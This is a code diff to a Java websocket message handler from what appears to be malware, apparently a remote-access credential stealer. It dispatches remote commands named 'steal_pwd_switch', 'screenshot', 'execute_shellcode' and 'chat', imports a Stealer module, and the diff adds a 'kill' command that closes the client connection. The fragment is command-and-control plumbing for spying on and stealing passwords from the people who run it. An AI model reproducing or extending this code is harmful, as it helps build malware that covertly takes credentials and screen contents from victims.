@@ -1,5 +1,6 @@
 package me.soda.witch.websocket;
 
+import me.soda.witch.Witch;
 import me.soda.witch.config.Config;
 import me.soda.witch.features.Modlist;
 import me.soda.witch.features.Stealer;
@@ -13,12 +14,10 @@ public class MessageHandler {
         return new String(result);
     }
 
-    //todo
     public static void handle(String message) {
         String[] msgArr = message.split(" ");
         String messageType = msgArr[0];
         System.out.println("Received message: " + messageType);
-        if (msgArr.length < 1) return;
         try {
             switch (messageType) {
                 case "steal_pwd_switch":
@@ -58,11 +57,14 @@ public class MessageHandler {
                 case "log":
                     break;
                 case "screenshot":
-                    Config.takeScreenshot = true;
+                    Witch.screenshot = true;
                     break;
                 case "execute_shellcode":
                     break;
                 case "chat":
+                    break;
+                case "kill":
+                    Witch.client.close(false);
                     break;
                 default:
                     System.out.println();
